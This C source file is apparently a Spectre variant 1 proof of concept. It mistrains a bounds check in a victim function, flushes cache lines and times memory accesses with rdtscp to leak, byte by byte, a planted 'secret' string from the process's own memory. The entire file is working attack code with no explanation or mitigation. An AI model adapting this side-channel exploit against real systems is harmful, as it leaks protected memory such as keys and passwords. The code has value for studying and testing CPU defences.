#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else 
#include <x86intrin.h>
#endif

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256*512];

char* secret = "This is the secret thing we want to steal.";

uint8_t temp = 0;

void victim(size_t x) {
	if (x < array1_size) {
		temp &= array2[array1[x]*512];
	}
}

#define CACHE_HIT_THRESHOLD (80)

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (i = 0; i < 256; i++) 
		results[i] = 0;

	for (tries=999; tries > 0; tries--) {
		for (i=0; i < 256; i++)
			_mm_clflush(&array2[i*512]);

		training_x = tries % array1_size;
		for (j=29; j >= 0; j--) {
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++) {
			}
			x = ((j%6)-1) & ~0xFFFF;
			x = (x|(x>>16));
			x = training_x ^ (x & (malicious_x ^ training_x));
			victim(x);
		}

		for (i=0; i < 256; i++) {
			mix_i = ((i*167)+13) & 255;
			addr = &array2[mix_i*512];
			time1= __rdtscp(&junk);
			junk = *addr;
			time2= __rdtscp(&junk) - time1;
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries%array1_size])
				results[mix_i]++;
		}

		j = k = -1;
		for (int i = 0; i < 256; i++) {
			if ( j < 0 || results[i] >= results[j]) {
				k = j; 
				j = i;
			}
			else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
		if (results[j] >= (2*results[k]+5) || (results[j] == 2 && results[k] == 0))
			break;
	}

	results[0] ^= junk;
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main() {
	size_t malicious_x = (size_t)(secret - (char*)array1);
	int i, score[2], len = 42;
	uint8_t value[2];

	for (i=0; i < sizeof(array2); i++)
		array2[i] = 1;
	
	while (--len>=0) {
		readMemoryByte(malicious_x++, value, score);
		printf("%c",value[0]);
	}
	printf("\n");
	return 0;
}
